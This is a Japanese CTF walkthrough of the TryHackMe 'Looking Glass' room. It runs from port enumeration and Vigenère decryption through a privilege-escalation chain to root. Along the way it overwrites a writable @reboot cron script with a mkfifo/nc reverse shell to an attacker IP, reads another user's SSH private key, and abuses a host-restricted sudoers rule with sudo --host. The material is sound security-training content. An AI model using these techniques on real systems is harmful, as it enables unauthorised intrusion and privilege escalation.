# Looking Glass CTF

https://tryhackme.com/room/lookingglass

## Enumeration

```shell
TARGET=10.201.57.140
```

### ポートスキャン

大量のポートがオープンしている。

```sh
root@ip-10-201-71-115:~# nmap -sV -p- $TARGET > nmap.txt

root@ip-10-201-71-115:~# cat ./nmap.txt | grep -v 'Dropbear'
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-24 05:31 BST
Nmap scan report for looking.thm (10.201.57.140)
Host is up (0.000094s latency).
Not shown: 60534 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9100/tcp  open  jetdirect?
9101/tcp  open  jetdirect?
9102/tcp  open  jetdirect?
9103/tcp  open  jetdirect?
9104/tcp  open  jetdirect?
9105/tcp  open  jetdirect?
9106/tcp  open  jetdirect?
9107/tcp  open  jetdirect?
MAC Address: 16:FF:E5:27:DB:1B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

9000-13999（9100-9107以外） は Dropbear sshd と判定されている。

```sh
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
```

```sh
root@ip-10-201-71-115:~# tail ./nmap.txt 
13995/tcp open  ssh        Dropbear sshd (protocol 2.0)
13996/tcp open  ssh        Dropbear sshd (protocol 2.0)
13997/tcp open  ssh        Dropbear sshd (protocol 2.0)
13998/tcp open  ssh        Dropbear sshd (protocol 2.0)
13999/tcp open  ssh        Dropbear sshd (protocol 2.0)
```

SSH接続を試すと、LowerとかHigherとかが返されており、それを手掛かりに当たりのポートを探すゲームになっている。

```sh
$ ssh test@$TARGET -p 9000 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
Lower
Connection to 10.201.57.140 closed.

$ ssh test@$TARGET -p 13999 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
Higher
Connection to 10.201.57.140 closed.
```

2分探索するスクリプトを作って、LowerでもHigherでもないポートを特定

```sh
$ python ./search.py 
[*] Trying port 11499...
 -> Result: Higher
[*] Trying port 10249...
 -> Result: Lower
[*] Trying port 10874...
 -> Result: Lower
[*] Trying port 11186...
 -> Result: Lower
[*] Trying port 11342...
 -> Result: Lower
[*] Trying port 11420...
 -> Result: Lower
[*] Trying port 11459...
 -> Result: Higher
[*] Trying port 11439...
 -> Result: Lower
[*] Trying port 11449...
 -> Result: Lower
[*] Trying port 11454...
 -> Result: Timeout
[+] Found possible correct port: 11454
[!] Correct port is likely 11454
```

暗号文が出てきた。

```sh
$ ssh test@$TARGET -p 11454 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

## 暗号

https://www.boxentriq.com/code-breaking/vigenere-cipher を使い、キーが判明。

```
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is [REDACTED]
```

暗号が出てきた画面で入力するとSSH認証が表示される。

## 権限昇格

```sh
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

```sh
jabberwock@looking-glass:~$ ls -al /sbin/reboot
lrwxrwxrwx 1 root root 14 May  3  2020 /sbin/reboot -> /bin/systemctl
```

rebootしたらtwasBrillig.shが実行される。

```sh
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

シェルは変更可能。

```sh
jabberwock@looking-glass:~$ ls -al /home/jabberwock/twasBrillig.sh
-rwxrwxr-x 1 jabberwock jabberwock 38 Jul  3  2020 /home/jabberwock/twasBrillig.sh

jabberwock@looking-glass:~$ cat /home/jabberwock/twasBrillig.sh
wall $(cat /home/jabberwock/poem.txt)
```

リバースシェルに書き換え

```sh
jabberwock@looking-glass:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.146.32 8888 >/tmp/f' >  /home/jabberwock/twasBrillig.sh
```

```sh
$ nc -lnvp 8888 
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.57.140] 53538
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
```

```sh
tweedledum@looking-glass:~$ sudo -l
Matching Defaults entries for tweedledum on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tweedledum may run the following commands on looking-glass:
    (tweedledee) NOPASSWD: /bin/bash
```

```sh
tweedledee@looking-glass:/home/tweedledee$ sudo -u tweedledum /bin/bash
tweedledum@looking-glass:/home/tweedledee$ 
```

hex2asciiで、一番下にパスワードが表示される。

```sh
$ cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
[REDACTED]
```

パスワードを使ってhumptydumptyになる。

```sh
tweedledum@looking-glass:~$ su humptydumpty
Password: 
humptydumpty@looking-glass:/home/tweedledum$ id
uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
```

/home/alice に実行権限が付いている。

```sh
humptydumpty@looking-glass:~$ ls -al /home
total 32
drwxr-xr-x  8 root         root         4096 Jul  3  2020 .
drwxr-xr-x 24 root         root         4096 Jul  2  2020 ..
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice
drwx------  3 humptydumpty humptydumpty 4096 Oct 24 05:55 humptydumpty
drwxrwxrwx  5 jabberwock   jabberwock   4096 Jul  3  2020 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
```

aliceの秘密鍵ゲット。

```sh
humptydumpty@looking-glass:~$ cat /home/alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
...
```

めぼしいものは無い。

```sh
$ ssh alice@$TARGET -i ./id_rsa
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ ls -al
total 40
drwx--x--x 6 alice alice 4096 Jul  3  2020 .
drwxr-xr-x 8 root  root  4096 Jul  3  2020 ..
lrwxrwxrwx 1 alice alice    9 Jul  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 Jul  3  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 Jul  3  2020 .bashrc
drwx------ 2 alice alice 4096 Jul  3  2020 .cache
drwx------ 3 alice alice 4096 Jul  3  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 Jul  3  2020 .local
-rw-r--r-- 1 alice alice  807 Jul  3  2020 .profile
drwx--x--x 2 alice alice 4096 Jul  3  2020 .ssh
-rw-rw-r-- 1 alice alice  369 Jul  3  2020 kitten.txt
```

ここは全く分からずウォークスルーを見た。

```sh
alice@looking-glass:~$ ls -al /etc/sudoers.d
total 24
drwxr-xr-x  2 root root 4096 Jul  3  2020 .
drwxr-xr-x 91 root root 4096 Oct 24 05:48 ..
-r--r-----  1 root root  958 Jan 18  2018 README
-r--r--r--  1 root root   49 Jul  3  2020 alice
-r--r-----  1 root root   57 Jul  3  2020 jabberwock
-r--r-----  1 root root  120 Jul  3  2020 tweedles
alice@looking-glass:~$ cat /etc/sudoers.d/alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

この構文は知らなかったが、ssalg-gnikoolホスト上でのみ有効という意味らしい。

また、sudo にはホスト名を指定して実行する機能がある。  
エラーが出るが、root昇格自体は成功している。・・・これはsudoのバグではないのだろうか？

```sh
alice@looking-glass:~$ sudo --host=ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 疲れた。
- `/etc/sudoers.d` は権限昇格のチェックリストにいちおう組み込んだ。あまり現実的ではないが。
- sudo でホスト名指定するのは知らなかったので勉強になった。
